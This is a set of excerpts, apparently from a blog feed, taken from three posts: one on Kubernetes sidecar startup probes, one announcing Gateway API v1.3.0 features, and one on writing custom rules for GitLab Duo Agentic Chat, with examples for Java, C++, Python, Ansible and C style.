backend for services.</p>\n<p>(Unlike standard init containers, sidecar containers can have <a href=\"https://kubernetes.io/docs/concepts/configuration/liveness-readiness-startup-probes/\">probes</a> so that the kubelet can supervise the sidecar and intervene if there are problems. For example, restarting a sidecar container if it fails a health check.)</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

Nevertheless, the main application is not restarted nor influenced at all, even though I'm aware that (in our imaginary worst-case scenario) it can error out when the sidecar is not there serving requests.\nWhat if I’d used a <code>livenessProbe</code> without lifecycle <code>postStart</code>? Both containers will be immediately ready: at the beginning, this behavior will not be different from the one without any additional probes since the liveness probe doesn’t affect readiness at all. After a while, the sidecar will begin to restart itself, but it won’t influence the main container.</p>\n<h2 id=\"findings-summary\">Findings summary</h2>\n<p>I’ll summarize the startup behavior in the table below:</p>\n<table>\n<thead>\n<tr>\n<th>Probe/Hook</th>\n<th>Sidecar starts before the main app?</th>\n<th>Main app waits for the sidecar to be ready?</th>\n<th>What if the check doesn’t pass?</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>readinessProbe</code></td>\n<td><strong>Yes</strong>, but it’s almost in parallel (effectively <strong>no</strong>)</td>\n<td><strong>No</strong></td>\n<td>Sidecar is not ready; main app continues running</td>\n</tr>\n<tr>\n<td><code>livenessProbe</code></td>\n<td>Yes, but it’s almost in parallel (effectively <strong>no</strong>)</td>\n<td><strong>No</strong></td>\n<td>Sidecar is restarted, main app continues running</td>\n</tr>\n<tr>\n<td><code>startupProbe</code></td>\n<td><strong>Yes</strong></td>\n<td><strong>Yes</strong></td>\n<td>Main app is not started</td>\n</tr>\n<tr>\n<td>postStart</td>\n<td><strong>Yes</strong>, main app container starts after <code>postStart</code> completes</td>\n<td><strong>Yes</strong>, but you have to provide custom logic for that</td>\n<td>Main app is not started</td>\n</tr>\n</tbody>\n</table>\n<p>To summarize: with sidecars often being a dependency of the main application, you may want to delay the start of the latter until the sidecar is healthy.\nThe ideal pattern is to start both containers simultaneously and have the app container logic delay at all levels, but it’s not always possible. If that's what you need, you have to use the right kind of customization to the Pod definition. Thankfully, it’s nice and quick, and you have the recipe ready above.</p>\n<p>Happy deploying!</p>",

We are\nalso pleased to announce that there are already a number of conformant\nimplementations to try, made possible by postponing this blog\nannouncement. Version 1.3.0 of the API was released about a month ago on\nApril 24, 2025.</p>\n<p>Gateway API v1.3.0 brings a new feature to the <em>Standard</em> channel\n(Gateway API's GA release channel): <em>percentage-based request mirroring</em>, and\nintroduces three new experimental features: cross-origin resource sharing (CORS)\nfilters, a standardized mechanism for listener and gateway merging, and retry\nbudgets.</p>\n<p>Also see the full\n<a href=\"https://github.com/kubernetes-sigs/gateway-api/blob/54df0a899c1c5c845dd3a80f05dcfdf65576f03c/CHANGELOG/1.3-CHANGELOG.md\">release notes</a>\nand applaud the\n<a href=\"https://github.com/kubernetes-sigs/gateway-api/blob/54df0a899c1c5c845dd3a80f05dcfdf65576f03c/CHANGELOG/1.3-TEAM.md\">v1.3.0 release team</a>\nnext time you see them.</p>\n<h2 id=\"graduation-to-standard-channel\">Graduation to Standard channel</h2>\n<p>Graduation to the Standard channel is a notable achievement for Gateway API\nfeatures, as inclusion in the Standard release channel denotes a high level of\nconfidence in the API surface and provides guarantees of backward compatibility.\nOf course, as with any other Kubernetes API, Standard channel features can continue\nto evolve with backward-compatible additions over time, and we (SIG Network)\ncertainly expect\nfurther refinements and improvements in the future. For more information on how\nall of this works, refer to the <a href=\"https://gateway-api.sigs.k8s.io/concepts/versioning/\">Gateway API Versioning Policy</a>.</p>\n<h3 id=\"percentage-based-request-mirroring\">Percentage-based request mirroring</h3>\n<p>Leads: <a href=\"https://github.com/LiorLieberman\">Lior Lieberman</a>,<a href=\"https://github.com/jakebennert\">Jake Bennert</a></p>\n<p>GEP-3171: <a href=\"https://github.com/kubernetes-sigs/gateway-api/blob/main/geps/gep-3171/index.md\">Percentage-Based Request Mirroring</a></p>\n<p><em>Percentage-based request mirroring</em> is an enhancement to the\nexisting support for <a href=\"https://gateway-api.sigs.k8s.io/guides/http-request-mirroring/\">HTTP request mirroring</a>, which allows HTTP requests to be duplicated to another backend using the\nRequestMirror filter type. Request mirroring is particularly useful in\nblue-green deployment. It can be used to assess the impact of request scaling on\napplication performance without impacting responses to clients.</p>\n<p>The previous mirroring capability worked on all the requests to a <code>backendRef</code>.<br />\nPercentage-based request mirroring allows users to specify a subset of requests\nthey want to be mirrored, either by percentage or fraction. This can be\nparticularly useful when services are receiving a large volume of requests.\nInstead of mirroring all of those requests, this new feature can be used to\nmirror a smaller subset of them.</p>\n<p>Here's an example with 42% of the requests to &quot;foo-v1&quot; being mirrored to &quot;foo-v2&quot;:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000; font-weight: bold;\">apiVersion</span>:<span style=\"color: #bbb;\"> </span>gateway.networking.k8s.io/v1<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000;

Please note: the experimental channel may include features that are\nchanged or removed later.</p>\n<p>Starting in release v1.3.0, in an effort to distinguish Experimental channel\nresources from Standard channel resources, any new experimental API kinds have the\nprefix &quot;<strong>X</strong>&quot;. For the same reason, experimental resources are now added to the\nAPI group <code>gateway.networking.x-k8s.io</code> instead of <code>gateway.networking.k8s.io</code>.\nBear in mind that using new experimental channel resources means they can coexist\nwith standard channel resources, but migrating these resources to the standard\nchannel will require recreating them with the standard channel names and API\ngroup (both of which lack the &quot;x-k8s&quot; designator or &quot;X&quot; prefix).</p>\n<p>The v1.3 release introduces two new experimental API kinds: XBackendTrafficPolicy\nand XListenerSet. To be able to use experimental API kinds, you need to install\nthe Experimental channel Gateway API YAMLs from the locations listed below.</p>\n<h3 id=\"cors-filtering\">CORS filtering</h3>\n<p>Leads: <a href=\"https://github.com/liangli\">Liang Li</a>, <a href=\"https://github.com/EyalPazz\">Eyal Pazz</a>, <a href=\"https://github.com/robscott\">Rob Scott</a></p>\n<p>GEP-1767: <a href=\"https://github.com/kubernetes-sigs/gateway-api/blob/main/geps/gep-1767/index.md\">CORS Filter</a></p>\n<p>Cross-origin resource sharing (CORS) is an HTTP-header based mechanism that allows\na web page to access restricted resources from a server on an origin (domain,\nscheme, or port) different from the domain that served the web page.

In\naddition, it expands upon the existing suggestion that Gateway API implementations\nmay merge configuration from multiple Gateway objects. It also:</p>\n<ul>\n<li>adds a new field <code>allowedListeners</code> to the <code>.spec</code> of a Gateway. The\n<code>allowedListeners</code> field defines from which Namespaces to select XListenerSets\nthat are allowed to attach to that Gateway: Same, All, None, or Selector based.</li>\n<li>increases the previous maximum number (64) of listeners with the addition of\nXListenerSets.</li>\n<li>allows the delegation of listener configuration, such as TLS, to applications in\nother namespaces.</li>\n</ul>\n<p>To be able to use experimental XListenerSet, you need to install the\n<a href=\"https://github.com/kubernetes-sigs/gateway-api/blob/main/config/crd/experimental/gateway.networking.x-k8s.io_xlistenersets.yaml\">Experimental channel Gateway API XListenerSet yaml</a>.</p>\n<p>The following example shows a Gateway with an HTTP listener and two child HTTPS\nXListenerSets with unique hostnames and certificates. The combined set of listeners\nattached to the Gateway includes the two additional HTTPS listeners in the\nXListenerSets that attach to the Gateway. This example illustrates the\ndelegation of listener TLS config to application owners in different namespaces\n(&quot;store&quot; and &quot;app&quot;). The HTTPRoute has both the Gateway listener named &quot;foo&quot; and\none XListenerSet listener named &quot;second&quot; as <code>parentRefs</code>.</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

This is used to limit additional client-side retries\nafter reaching a configured threshold. When configuring the budget, the maximum\npercentage of active requests that may consist of retries may be specified, as well as\nthe interval over which requests will be considered when calculating the threshold\nfor retries. The development of this specification changed the existing\nexperimental API kind BackendLBPolicy into a new experimental API kind,\nXBackendTrafficPolicy, in the interest of reducing the proliferation of policy\nresources that had commonalities.</p>\n<p>To be able to use experimental retry budgets, you need to install the\n<a href=\"https://github.com/kubernetes-sigs/gateway-api/blob/main/config/crd/experimental/gateway.networking.x-k8s.io_xbackendtrafficpolicies.yaml\">Experimental channel Gateway API XBackendTrafficPolicy yaml</a>.</p>\n<p>The following example shows an XBackendTrafficPolicy that applies a\n<code>retryConstraint</code> that represents a budget that limits the retries to a maximum\nof 20% of requests, over a duration of 10 seconds, and to a minimum of 3 retries\nover 1 second.</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000; font-weight: bold;\">apiVersion</span>:<span style=\"color: #bbb;\"> </span>gateway.networking.x-k8s.io/v1alpha1<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">kind</span>:<span style=\"color: #bbb;\"> </span>XBackendTrafficPolicy<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">metadata</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">name</span>:<span style=\"color: #bbb;\"> </span>traffic-policy-example<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">spec</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">retryConstraint</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">budget</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">percent</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #666;\">20</span><span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">interval</span>:<span style=\"color: #bbb;\"> </span>10s<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">minRetryRate</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">count</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #666;\">3</span><span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">interval</span>:<span style=\"color: #bbb;\"> </span>1s<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span>...<span style=\"color: #bbb;\">\n</span></span></span></code></pre></div><h2 id=\"try-it-out\">Try it out</h2>\n<p>Unlike other Kubernetes APIs, you don't need to upgrade to the latest version of\nKubernetes to get the latest version of Gateway API.

Custom rules support <a href=\"https://docs.gitlab.com/user/markdown/\">Markdown</a> for better structuring.</p>\n<ul>\n<li>Use markdown headings (<code>#</code>, <code>##</code>, etc) to create sections.</li>\n<li>Use markdown lists (<code>-</code>) to provide concise instructions for LLMs and Agents.</li>\n<li>Escape file paths with single backticks, and use code blocks with indent or three backticks.</li>\n</ul>\n<p>Example:</p>\n<pre><code class=\"language-markdown\"># Development guide\n\n## Frontend: VueJS\n\n### Styling Pattern\n- Do not use `&lt;style&gt;` tags in Vue components\n- Use Tailwind CSS utility classes or page-specific CSS instead\n</code></pre>\n<p>Important: After modifying custom rules, you'll need to create a new Chat by pressing the <code>+</code> icon, or sending <code>/new</code> in the chat prompt.</p>\n<h3>Requirements</h3>\n<p>In order to follow all use cases and linked demo projects into this blog post, please ensure you meet these requirements first:</p>\n<ul>\n<li>Verify that you have <a href=\"https://docs.gitlab.com/user/get_started/getting_started_gitlab_duo/\">access to GitLab Duo</a>, and <a href=\"https://docs.gitlab.com/user/gitlab_duo_chat/agentic_chat/\">Duo Agentic Chat is configured in supported IDEs</a>.</li>\n<li>Fork/copy the GitLab projects, and clone them locally in the IDEs.</li>\n<li>Follow the steps in each use case for custom rule creation, and how to use Duo Agentic Chat prompts to proof the rule behavior.</li>\n<li>You can use the existing source code, or copy in your own.</li>\n</ul>\n<p>The projects are available in the <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules\">Custom rules for GitLab Duo Agent Platform (Agentic AI) group</a>. Please note that these custom rules are provided for demo purposes &quot;as is,&quot; and you may need to adapt or modify them to fit your specific requirements.</p>\n<h3>Quick start: 5-minute success</h3>\n<p>Ready to see custom rules in action? Try this simple example:</p>\n<ol>\n<li>Create <code>.gitlab/duo/chat-rules.md</code> in your GitLab project:</li>\n</ol>\n<pre><code class=\"language-markdown\">## C style guide\n- goto is not allowed. If the developer continues asking about it, share this URL https://xkcd.com/292/\n</code></pre>\n<ol start=\"2\">\n<li>Open GitLab Duo Agentic Chat in the IDE, and ask: <code>Write a C program with goto statements</code>.</li>\n<li>Watch as GitLab Duo refuses and suggests better alternatives!</li>\n</ol>\n<p>&lt;figure class=&quot;video_container&quot;&gt;\n&lt;iframe width=&quot;560&quot; height=&quot;315&quot;\nsrc=&quot;https://www.youtube.com/embed/C0eMKjRMI5w&quot; frameborder=&quot;0&quot;\nallowfullscreen=&quot;true&quot;&gt;\n&lt;/iframe&gt;\n&lt;/figure&gt;</p>\n<h3>Guidelines for custom rule development</h3>\n<p>Custom rules are similar to code: Start with the smallest working example, and then iterate on improvements. The use case examples in this deep-dive range from small to more advanced, and were developed and tested over the last weeks. They are not perfect, and require your feedback and iteration.</p>\n<p>One good rule of thumb, for example, is not overloading style guides with many pages from a wiki document. In my experience, less is more. Only include the points that are helpful in the context of what you're writing about. You can ask GitLab Duo Chat to summarize larger documents before adding them to the custom rules.</p>\n<p>Verify the use of any included specifications during development to avoid creating barriers and unwanted behavior.</p>\n<p>When you are using a publicly documented style guide, refer to its name. There is a high chance that the LLM is trained with this data already.</p>\n<h3>Ask GitLab Duo Chat about existing development style guides</h3>\n<p>Sometimes, there are no specific style guides in a project yet, or it is unclear how to use them. Use AI for onboarding and best practices to discuss with your team.</p>\n<pre><code class=\"language-markdown\">Which Python development or environment guidelines can you recommend when I want to create custom rules for AI to get tailored output? I need a list with textual instructions.\n</code></pre>\n<p>You can also ask Duo Agentic Chat to analyze the existing CI/CD linter integrations that may already check for a specific development style.</p>\n<pre><code class=\"language-markdown\">When you look into the CI/CD linter checks and configuration in the project, which development style guide can you summarize for me?\n</code></pre>\n<p>Many examples in this deep-dive blog are based on my own experience and pain points as a developer. I also asked GitLab Duo to extract style guides from existing projects, and used GitLab Duo Code Suggestions to help with auto-completing existing custom rules. You can achieve the same by configuring <a href=\"https://docs.gitlab.com/user/project/repository/code_suggestions/supported_extensions/#add-support-for-more-languages\"><code>markdown</code> as an additional language for GitLab Duo Code Suggestions</a> in IDEs.</p>\n<h2>More custom rules use cases</h2>\n<p>The following sections provide an overview of specific style guides. You can map similar programming languages and environments to your production use cases.</p>\n<ul>\n<li><strong>Version and platform support</strong>: Refer to the <a href=\"https://about.gitlab.com/atom.xml#java-version-requirements\">Java section below</a> to learn how to force a specific language standard for generated and created code.

The following examples highlight these scenarios.</p>\n<h4>Java version requirements</h4>\n<p>Enterprise environments do not always use the latest and greatest software version. They often rely on versions that are maintained with security patches for a longer period of time. For example, you will find Java 7 and Java 8 still in use in some enterprises today.</p>\n<p>Always prepending the required version in chat prompts can be cumbersome, and lead to human error, even if you only forget one time.</p>\n<pre><code class=\"language-markdown\">Implement classes for managing banking transactions and different currencies.\n</code></pre>\n<p>The example will need additional specifications for Java 8:</p>\n<pre><code class=\"language-markdown\">Use Java 8 for the implementation.\n</code></pre>\n<p>To permanently enforce Java 8, you can create a custom rule in <code>.gitlab/duo/chat-rules.md</code> and optionally add a reference epic URL when asked for code modernization:</p>\n<pre><code class=\"language-markdown\">## Java style guide\n\n- Only Java 8 is allowed when suggesting and editing code.\n- When the user asks about code modernization and Java 9 or 21, or newer, point them to this issue to contribute: https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-java-versions/-/issues/1\n</code></pre>\n<p>A full demonstration is available in the <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-java-versions\">Custom Rules - Java versions project</a>.</p>\n<p>&lt;figure class=&quot;video_container&quot;&gt;\n&lt;iframe width=&quot;560&quot; height=&quot;315&quot;\nsrc=&quot;https://www.youtube.com/embed/iZLvpgHdABY&quot; frameborder=&quot;0&quot;\nallowfullscreen=&quot;true&quot;&gt;\n&lt;/iframe&gt;\n&lt;/figure&gt;</p>\n<p>The resulting changes are available in <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-java-versions/-/merge_requests/2\">this MR</a>.</p>\n<h4>C++ multi-platform support (Windows, Linux, macOS)</h4>\n<p>Application development in C++ can require multi-platform support, especially when running service agents on systems using Windows, Linux, and macOS. The applications are deeply integrated into customer products, and a migration to a more modern language like Go or Rust is not always possible or practical.</p>\n<p>Maintaining code that works on multiple platforms can be challenging due to differences in Operating system APIs, toolchains, library versions, and file system paths. Developers often face multiple <code>#if defined</code> pre-processor macros, nested conditions, and adding custom code and tests for each supported platform. This adds technical debt and can introduce maintenance challenges.</p>\n<p>AI can help when generating correct and platform-specific code, but it needs to know about these requirements. Agentic AI will either understand the existing code base through a knowledge graph, or developers will need to provide instructions through custom rules and chat prompts.</p>\n<p>Let's try this use case in practice. The <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-cpp-platform-iot-sensor-data-collector\">Custom Rule - C++ platforms - IoT Sensor Data Collector project</a> implements an IoT sensor data collector and has open tasks to modernize the code base, and add multi-platform support for Linux, Windows, and macOS. You can fork the project and clone it locally.</p>\n<p>Open the <code>.gitlab/duo/chat-rules.md</code> file and review or add the following custom rules:</p>\n<pre><code class=\"language-markdown\">## C++ style guide\n\n- The application runs on Linux, macOS and Windows. Generate code that handles the OS API differences.\n- Use pre-processor macros for Windows and POSIX conventions for Unix (Linux, macOS).\n\n## CI/CD Configuration\n\n- Ensure that GitLab CI/CD jobs cover the different platform support. Use CI/CD job templates with extends where applicable.\n</code></pre>\n<p>Start a new Chat, and ask to restructure code for multi-platform support.</p>\n<pre><code class=\"language-markdown\">Please help me restructure the code and ensure multi-platform support.\n</code></pre>\n<p>You can also refer to the issue number, or URL (<a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-cpp-platform-iot-sensor-data-collector/-/issues/3\">issue 3</a>). GitLab Duo will automatically fetch the issue content from the GitLab platform, and put it into AI context.</p>\n<pre><code class=\"language-markdown\">Please help me implement issue 3\n\nPlease help me implement https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-cpp-platform-iot-sensor-data-collector/-/issues/3\n</code></pre>\n<p>&lt;figure class=&quot;video_container&quot;&gt;\n&lt;iframe width=&quot;560&quot; height=&quot;315&quot;\nsrc=&quot;https://www.youtube.com/embed/C5NxOjB0R1Q&quot; frameborder=&quot;0&quot;\nallowfullscreen=&quot;true&quot;&gt;\n&lt;/iframe&gt;\n&lt;/figure&gt;</p>\n<h3>Use case: Development environments</h3>\n<p>Development environments often vary between operating systems and developers. This can be confusing for AI models generating code or suggesting changes. The following use cases illustrate these environment problems and their solutions with custom rules.</p>\n<h4>Python 3 development environment</h4>\n<p>A Python development environment usually comes with the <code>python</code> executable and <code>pip</code> package manager. However, on systems like MacOS or Ubuntu, you need to use <code>python3</code> and <code>pip3</code> to get access to more recent Python 3 versions. This can create confusion running Python scripts, creating virtual environments, and installing package dependencies.</p>\n<p>For this custom rules use case, I installed Python using <a href=\"https://brew.sh/\">Homebrew</a> which results in a binary executable called <code>python3</code> and a package manager <code>pip3</code>.</p>\n<p>As an example, set up a Python virtual environment, install dependencies using <code>pip</code>, and run the application:</p>\n<pre><code class=\"language-shell\">python -m venv myenv\nsource myenv/bin/activate\n\npip install -r requirements.txt\n\npython script.py\n</code></pre>\n<p>This doesn't work as expected because we need to use specific binaries with version <code>3</code>:</p>\n<pre><code class=\"language-shell\">python3 -m venv myenv\nsource myenv/bin/activate\n\npip3 install -r requirements.txt\n\npython3 script.py\n</code></pre>\n<p>We can test this problem with Agentic Chat for both, suggested code blocks, and the approval request for commands to execute. The <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-python-3-env-shop-app\">Custom Rule - Python3 Env Shop app project</a> implements a web shop application in Python, and provides the default Python executable paths in its <code>README.md</code> file which typically gets added into Agentic Chat context.</p>\n<p><img alt=\"Duo Agentic Chat, proposing the wrong binary commands\" src=\"https://about.gitlab.com/images/blog/custom-rules-gitlab-duo-agent-platform-deepdive/gitlab-duo-custom-rules-python3-env-problem.png\" /></p>\n<p>In order to overcome the problem, review <code>.gitlab/duo/chat-rules.md</code> which contains the following custom rules to enforce the Python executable names.</p>\n<pre><code class=\"language-markdown\">## Python style guide\n\n- For Python binaries, always use python3 and pip3 when suggesting or running shell commands.\n- Detect the Python environment automatically when possible.\n</code></pre>\n<p>You can also instruct agents with pre-defined routes to gather additional information through tool calling and/or MCP, when they do not attempt this automatically already.</p>\n<p>Open a new Agentic Chat, and ask <code>How to run this application?</code> to see custom rules in action, using <code>python3</code> and <code>pip3</code> as desired.</p>\n<p>&lt;figure class=&quot;video_container&quot;&gt;\n&lt;iframe width=&quot;560&quot; height=&quot;315&quot;\nsrc=&quot;https://www.youtube.com/embed/UQ2_OCvUmF0&quot; frameborder=&quot;0&quot;\nallowfullscreen=&quot;true&quot;&gt;\n&lt;/iframe&gt;\n&lt;/figure&gt;</p>\n<p>The full source code is available in the <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-python-3-env-shop-app\">Custom Rule - Python3 Env Shop app project</a>.</p>\n<h4>Ansible linter compliance</h4>\n<p>Modern Ansible for Infrastructure-as-Code tasks enforces a strict style guide, which can be verified using <code>ansible-lint</code>: It detects when Boolean values (<code>true</code>/<code>false</code>) are required instead of strings (<code>yes</code>/<code>no</code>), builtin module actions requiring the FQCN (Fully Qualified Collection Name) as parameter names, and trailing whitespaces that need trimming. CLI and IDE integrations, such as the <a href=\"https://developers.redhat.com/learning/learn:ansible:get-started-ansible-visual-studio-code-extension/resource/resources:install-and-configure-ansible-extension-visual-studio-code\">VS Code Ansible extension by Red Hat</a> help visualize these errors to developers. LLMs and chat agents might not always generate correct Ansible code and need manual work to fix it.</p>\n<p>Let's look at the problem with a concrete use case. The following example implements a basic Ansible playbook in the <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-ansible-environment\">Custom Rule - Ansible Environment project</a> to set up a GitLab server on Ubuntu. You'll notice the Boolean values are incorrectly typed as strings (<code>yes</code>/<code>no</code>), and additional problem reports for builtin module actions and whitespace trimming.</p>\n<p><img alt=\"VS Code with Ansible lint error: Wrong boolean type\" src=\"https://about.gitlab.com/images/blog/custom-rules-gitlab-duo-agent-platform-deepdive/gitlab-duo-custom-rules-ansible-problem01-boolean.png\" /></p>\n<p><img alt=\"VS Code with Ansible lint error: Builtin module action FQCN\" src=\"https://about.gitlab.com/images/blog/custom-rules-gitlab-duo-agent-platform-deepdive/gitlab-duo-custom-rules-ansible-problem02-fqcn.png\" /></p>\n<p><img alt=\"VS Code with Ansible lint error: trailing whitespaces\" src=\"https://about.gitlab.com/images/blog/custom-rules-gitlab-duo-agent-platform-deepdive/gitlab-duo-custom-rules-ansible-problem03-whitespaces.png\" /></p>\n<p>Let's see how we can create custom rules to help Duo Agents fix the Ansible linter errors, and prevent them from happening in the future.</p>\n<p>Fork and clone the <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-ansible-environment\">Custom Rule - Ansible Environment project</a> and open <code>.gitlab/duo/chat-rules.md</code> in the IDE inspect the custom rules:</p>\n<pre><code class=\"language-markdown\">## Ansible styleguide\n\n- Boolean values in Ansible should be typed as &quot;true&quot; or &quot;false&quot; and never as string.\n- Ansible module builtin actions must use the FQCN (Fully Qualified Collection Name).\n- Always trim whitespaces in Ansible YAML.\n</code></pre>\n<p>Open a new GitLab Duo Agentic Chat prompt, and ask Duo Agent for the same Ansible playbook:</p>\n<pre><code class=\"language-markdown\">Please help me fix the Ansible linter errors\n</code></pre>\n<p>The Agents will analyze the repository, ask to run <code>ansible-lint</code> commands, and investigate how to fix the problems followed the defined custom rules.</p>\n<p>&lt;figure class=&quot;video_container&quot;&gt;\n&lt;iframe width=&quot;560&quot; height=&quot;315&quot;\nsrc=&quot;https://www.youtube.com/embed/P465U8IfScE&quot; frameborder=&quot;0&quot;\nallowfullscreen=&quot;true&quot;&gt;\n&lt;/iframe&gt;\n&lt;/figure&gt;</p>\n<p>You can inspect the custom rules and Ansible code changes in <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-ansible-environment/-/merge_requests/1\">this MR</a> in the <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-ansible-environment\">Custom Rule - Ansible Environment project</a>.</p>\n<p>Async exercise: Start a new project where custom rules are configured as default already, and verify the correct style guide applied immediately.</p>\n<h3>Use case: Design patterns</h3>\n<p>Design patterns and patterns-to-avoid are specific to languages and frameworks. This is the main focus in this section.</p>\n<h4>Avoid anti-patterns with C and goto statements</h4>\n<p>This is a more in-depth walkthrough of the <a href=\"https://about.gitlab.com/atom.xml#quick-start-5-minute-success\">quickstart example</a>, and shows how you can instruct Agentic AI to avoid the <code>goto</code> anti-pattern in C. The <code>goto</code> anti-pattern in C is discouraged as it makes code harder to read and debug.  To illustrate the problem, here is an example of a for-loop which increments the loop variable inside the loop body:</p>\n<pre><code class=\"language-C\">// Bad C programming style: uses the goto anti-pattern\nfor (int i = 0; i &lt; 10; i++) {\n  if (someCondition) {\n    goto label;\n  }\n  doSomething();\nlabel:\n  doAnotherThing();\n  }\n</code></pre>\n<p>In the above code, the <code>goto</code> statement causes the program control to jump directly to the label <code>label</code>, which is inside the loop. This makes the program harder to read, understand and debug.</p>\n<p>A better approach would be to rework the logic, so you avoid the <code>goto</code> anti-pattern.  Here's a rewritten version that avoids <code>goto</code>:</p>\n<pre><code class=\"language-C\">// Good C programming style: avoids the goto anti-pattern\nfor (int i = 0; i &lt; 10; i++) {\n  if (someCondition) {\n    doAnotherThing();\n    continue;\n  }\n  doSomething();\n  doAnotherThing();\n}\n</code></pre>\n<p>There are occassions where <code>goto</code> is allowed, but in this use case we want to look how we can instruct agentic AI to avoid <code>goto</code> completely. This includes new code additions, as well as modernizing and refactoring the code.</p>\n<p>The <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-c-anti-patterns-with-goto\">Custom Rule - C anti-patterns with Goto project</a> provides a network socket server/client example, including custom rules in the <code>.gitlab/duo/chat-rules.md</code> file.

The following section explores a variety of use cases. You can use them as inspiration for your own custom rules.</p>\n<p>Common DevSecOps automation with custom rules:</p>\n<ul>\n<li><strong>Project bootstrap</strong>: Auto-create README, .gitignore, CI/CD config</li>\n<li><strong>Security defaults</strong>: Enforce SAST, dependency scanning, secrets detection</li>\n<li><strong>Documentation</strong>: Generate issue/MR templates, architecture diagrams</li>\n</ul>\n<p>A combined use case example is available in the <a href=\"https://gitlab.com/gitlab-da/use-cases/ai/gitlab-duo-agent-platform/custom-rules/custom-rule-devsecops-workflows\">Custom Rule - DevSecOps workflows - Git README build tools issue MR templates project</a>. You can inspect the custom rules, and fork/clone it locally to ask Agentic Chat with a new prompt such as: <code>I need to bootstrap this project. Please help me with that</code>.</p>\n<p>&lt;figure class=&quot;video_container&quot;&gt;\n&lt;iframe width=&quot;560&quot; height=&quot;315&quot;\nsrc=&quot;https://www.youtube.com/embed/hKpLcBtbC4g&quot; frameborder=&quot;0&quot;\nallowfullscreen=&quot;true&quot;&gt;\n&lt;/iframe&gt;\n&lt;/figure&gt;</p>\n<p>The next sections provide detailed prompts, and most of them are shown in the recording, too.</p>\n<h4>Issue and MR templates</h4>\n<p>You can instruct agentic AI to create issue/MR templates when they are missing, and offer to add project-specific information or labels. Agents will automatically query the GitLab API in the background, and put the current project structure into a template.</p>\n<pre><code class=\"language-markdown\">## Issue and MR templates\n\n- If no issue templates for `Default` and `Feature Proposal` exist in .gitlab/issue_templates, create them using the following raw template sources:\n\n        Default: https://gitlab.com/gitlab-org/gitlab-vscode-extension/-/raw/main/.gitlab/issue_templates/Default.md\n        Feature Proposal: https://gitlab.com/gitlab-org/gitlab-vscode-extension/-/raw/main/.gitlab/issue_templates/Feature%20Proposal.md\n\n- If no default MR template `Default` exists in `.gitlab/merge_request_templates`, create them using the following raw template sources:\n\n        Default: https://gitlab.com/gitlab-org/gitlab-vscode-extension/-/raw/main/.gitlab/merge_request_templates/Default.md\n\n- Update the project URLs, and available labels in the fetched templates accordingly, or remove anything unknown and let the user know about TODOs.\n- Create a test issue/MR, when bootstrapping a new project.\n</code></pre>\n<h4>Build 